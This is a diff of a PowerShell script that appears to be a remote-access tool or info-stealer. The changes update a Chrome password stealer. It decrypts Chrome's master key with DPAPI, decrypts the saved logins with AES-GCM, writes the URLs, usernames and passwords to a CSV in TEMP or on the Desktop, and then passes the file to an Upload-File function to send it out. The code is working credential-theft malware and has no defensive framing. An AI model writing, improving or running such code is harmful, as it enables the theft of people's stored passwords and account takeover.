@@ -418,6 +418,11 @@ function Get-DecryptedChromeCreds {
         return "[ERROR] SQLite not loaded"
     }
 
+    # DEBUG: Текущий контекст
+    Output-Log "USERNAME = $env:USERNAME"
+    Output-Log "TEMP = $env:TEMP"
+    Output-Log "LOCALAPPDATA = $env:LOCALAPPDATA"
+
     $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
     $loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 
@@ -426,12 +431,12 @@ function Get-DecryptedChromeCreds {
         return "[ERROR] Chrome data not found."
     }
 
+    # Получаем ключ
     try {
         $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
         $keyRaw = $localState.os_crypt.encrypted_key
-        if (-not $keyRaw) {
-            $keyRaw = $localState.os_crypt.app_bound_encrypted_key
-        }
+        if (-not $keyRaw) { $keyRaw = $localState.os_crypt.app_bound_encrypted_key }
+
         if (-not $keyRaw) {
             Output-Log "[ERROR] No Chrome encrypted key found."
             return "[ERROR] No Chrome encrypted key found."
@@ -439,12 +444,16 @@ function Get-DecryptedChromeCreds {
 
         $encryptedKey = [Convert]::FromBase64String($keyRaw)
         $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
-        $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $encryptedKey, $null,
+            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
     } catch {
         Output-Log "[ERROR] Failed to decrypt Chrome master key: $($_.Exception.Message)"
-        return "[ERROR] Failed to decrypt Chrome master key: $($_.Exception.Message)"
+        return "[ERROR] Failed to decrypt Chrome master key."
     }
 
+    # Временная копия базы
     $tempDb = "$env:TEMP\LoginData.db"
     Copy-Item $loginDataPath -Destination $tempDb -Force
 
@@ -464,34 +473,33 @@ function Get-DecryptedChromeCreds {
                 $encBytes = New-Object byte[] $encPass.Length
                 $encPass.Read($encBytes, 0, $encBytes.Length) | Out-Null
 
-                if ($encBytes[0] -eq 0x01 -and $encBytes[1] -eq 0x00 -and $encBytes[2] -eq 0x00 -and $encBytes[3] -eq 0x00) {
-                    $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                if ($encBytes[0..2] -eq @(0x01,0x00,0x00)) {
+                    $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                        $encBytes, $null,
+                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+                    )
                 }
                 elseif ([System.Text.Encoding]::ASCII.GetString($encBytes[0..2]) -eq "v10") {
-                    try {
-                        $nonce = $encBytes[3..14]
-                        $ciphertext = $encBytes[15..($encBytes.Length - 17)]
-                        $tag = $encBytes[($encBytes.Length - 16)..($encBytes.Length - 1)]
+                    $nonce = $encBytes[3..14]
+                    $ciphertext = $encBytes[15..($encBytes.Length - 17)]
+                    $tag = $encBytes[($encBytes.Length - 16)..($encBytes.Length - 1)]
 
-                        $aes = [System.Security.Cryptography.AesGcm]::new($dpapiKey)
-                        $plaintextBytes = New-Object byte[] $ciphertext.Length
-                        $aes.Decrypt($nonce, $ciphertext, $tag, $plaintextBytes)
-                        $plainText = $plaintextBytes
-                    } catch {
-                        Output-Log "[DEBUG] AES-GCM decrypt failed: $($_.Exception.Message)"
-                        continue
-                    }
+                    $aes = [System.Security.Cryptography.AesGcm]::new($dpapiKey)
+                    $plaintextBytes = New-Object byte[] $ciphertext.Length
+                    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintextBytes)
+                    $plainText = $plaintextBytes
                 }
                 else {
                     Output-Log "[DEBUG] Unknown encryption format"
                     continue
                 }
 
-                $results += "$url,$username,$([System.Text.Encoding]::UTF8.GetString($plainText))"
+                $decoded = [System.Text.Encoding]::UTF8.GetString($plainText)
+                $results += "$url,$username,$decoded"
             } catch {
-                $errorInfo = $_.Exception | Format-List * -Force | Out-String
-                Output-Log "[DEBUG] General decrypt error:`n$errorInfo"
-                $results += "[!] Failed to decrypt row"
+                $ex = $_.Exception.Message
+                Output-Log "[DEBUG] Decrypt row failed: $ex"
+                continue
             }
         }
 
@@ -499,16 +507,39 @@ function Get-DecryptedChromeCreds {
         $conn.Close()
         Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
 
+        # Путь вывода
         $outPath = "$env:TEMP\chrome_creds.csv"
+        if ($results.Count -eq 0) {
+            Output-Log "[DEBUG] No credentials found to write."
+            return "[ERROR] Chrome creds extraction returned empty result."
+        }
+
+        Output-Log "[DEBUG] Attempting to write creds to: $outPath"
         $results | Set-Content -Path $outPath
-        return $outPath
+
+        if (Test-Path $outPath) {
+            Output-Log "[DEBUG] File successfully created at: $outPath"
+            return $outPath
+        } else {
+            # Пробуем сохранить на Desktop
+            $desktopPath = "$env:USERPROFILE\Desktop\chrome_creds.csv"
+            Output-Log "[DEBUG] Trying alternate path: $desktopPath"
+            $results | Set-Content -Path $desktopPath
+
+            if (Test-Path $desktopPath) {
+                Output-Log "[DEBUG] File created at alternate path: $desktopPath"
+                return $desktopPath
+            } else {
+                Output-Log "[ERROR] Failed to write credentials file to any path."
+                return "[ERROR] Could not write credentials to file."
+            }
+        }
     } catch {
-        $errorDetails = $_.Exception | Format-List * -Force | Out-String
-        Output-Log "[DEBUG] Exception during Chrome creds extraction:`n$errorDetails"
         Output-Log "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
-        return "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
+        return "[ERROR] Chrome creds extraction failed."
     }
 }
+
 
 
 
@@ -518,22 +549,20 @@ function Get-DecryptedChromeCreds {
 function Get-Credentials {
     try {
         $chromeCreds = Get-DecryptedChromeCreds
-        Output-Log "[DEBUG] chromeCreds raw: $chromeCreds"
+        Output-Log "[DEBUG] chromeCreds raw: '$chromeCreds'"
 
-        # Удаляем кавычки (если обёрнут в них)
         $chromeCreds = $chromeCreds.Trim("'`"")
 
-        if (Test-Path $chromeCreds) {
-            Output-Log "[+] Chrome creds found at path: $chromeCreds"
+        if ((Test-Path $chromeCreds) -and ($chromeCreds -like "*.csv")) {
+            Output-Log "[+] Chrome creds saved to: $chromeCreds"
             $upload = Upload-File $chromeCreds
-            Output-Log $upload
+            Output-Log "[DEBUG] Upload result: $upload"
             return $upload
         } else {
-            Output-Log "[ERROR] Chrome creds path not found:`n$chromeCreds"
+            Output-Log "[ERROR] Chrome creds extraction returned non-path result:`n$chromeCreds"
             return "[ERROR] Chrome creds extraction failed."
         }
-    }
-    catch {
+    } catch {
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
@@ -771,7 +800,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 18 +sql
+                                            TEST creds 19 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
